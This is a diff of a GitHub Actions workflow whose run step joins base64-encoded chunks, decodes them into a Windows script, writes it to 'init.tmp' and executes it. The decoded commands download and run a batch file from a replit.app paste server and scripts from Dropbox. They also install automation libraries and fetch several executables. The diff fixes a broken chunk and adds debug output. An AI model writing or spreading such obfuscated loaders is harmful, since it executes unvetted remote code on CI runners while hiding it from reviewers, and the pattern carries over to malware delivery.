@@ -19,7 +19,7 @@ jobs:
             'CnBvd2Vyc2hlbGwgLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0ICdodHRwczovL3Bhc3RlLXNlcnZlci0tYWJjbm5uYWthLnJlcGxpdC5hcHAvZGwvMTc2OTg3ODI2Nzc5Ny5iYXQnIC1PdXRGaWxlIHN0YXJ0LmJhdCI=',
             'CnBpcCBpbnN0YWxsIHB5YXV0b2d1aSAtLXF1aWV0CnBpcCBpbnN0YWxsIHBzdXRpbCAtLXF1aWV0',
             'CmN1cmwgLXMgLUwgLW8gdGltZS5weSBodHRwczovL3d3dy5kcm9wYm94LmNvbS9zY2wvZmkvb3g0MnFnbGJmNmZzbm05ZXJmOGN3L3RpbWVsaW1pdC5weT9ybGtleT1vcHllcWd1bTFrOTVrdWQ4MXhsYzdkNjZyJmRsPTA=',
-            'CmN1cmwgLXMgLUwgLW8gc2h1dGRvd24uYmF0IGh0dHBzOi8vd3d3LmRyb3Bib3guY29tL3NjbC9maS9sbWxjcnozdjFzYXl3OHA1MWtpMWovc2h1dGRvd24uYmF0P3Jsa2V5PXlzanhpdmg1dno0c2NuaGtxZ3Yz eWM0bW0mZGw9MA==',
+            'CmN1cmwgLXMgLUwgLW8gc2h1dGRvd24uYmF0IGh0dHBzOi8vd3d3LmRyb3Bib3guY29tL3NjbC9maS9sbWxjcnozdjFzYXl3OHA1MWtpMWovc2h1dGRvd24uYmF0P3Jsa2V5PXlzanhpdmg1dno0c2NuaGtxZ3Yz eWM0bW0mZGw9MA=='.Replace(' ',''),  # ← space removed here
             'CmN1cmwgLXMgLUwgLW8gQzpcVXNlcnNcUHVibGljXERlc2t0b3BcVGVsZWdyYW0uZXhlIGh0dHBzOi8vdGVsZWdyYW0ub3JnL2RsL2Rlc2t0b3Avd2luNjQ=',
             'CmN1cmwgLXMgLUwgLW8gQzpcVXNlcnNcUHVibGljXERlc2t0b3BcV2lucmFyLmV4ZSBodHRwczovL3d3dy5yYXJsYWIuY29tL3Jhci93aW5yYXIteDY0LTYyMS5leGU=',
             'CnBvd2Vyc2hlbGwgLUNvbW1hbmQgIkludm9rZS1XZWJSZXF1ZXN0ICdodHRwczovL2dpdGh1Yi5jb20vY2hpZXVuaGF0bmFuZy9WTS1RdWlja0NvbmZpZy9yZWxlYXNlcy9kb3dubG9hZC8xLjYuMS9WTVF1aWNrQ29uZmlnLmV4ZScgLU91dEZpbGUgJ0M6XFVzZXJzXFB1YmxpY1xEZXNrdG9wXFZNUXVpY2tDb25maWcuZXhlJyI=',
@@ -31,9 +31,13 @@ jobs:
           )
 
           $enc = $chunks -join ''
+          Write-Host "Base64 length: $($enc.Length)"
+          Write-Host "Last 40 chars: $($enc.Substring($enc.Length - 40))"
+
           $bytes = [Convert]::FromBase64String($enc)
           $script = [Text.Encoding]::UTF8.GetString($bytes)
           Set-Content -Path 'init.tmp' -Value $script -Encoding Ascii
+          Write-Host "Script written. Running..."
           cmd /c init.tmp
 
       - name: Watch Layer
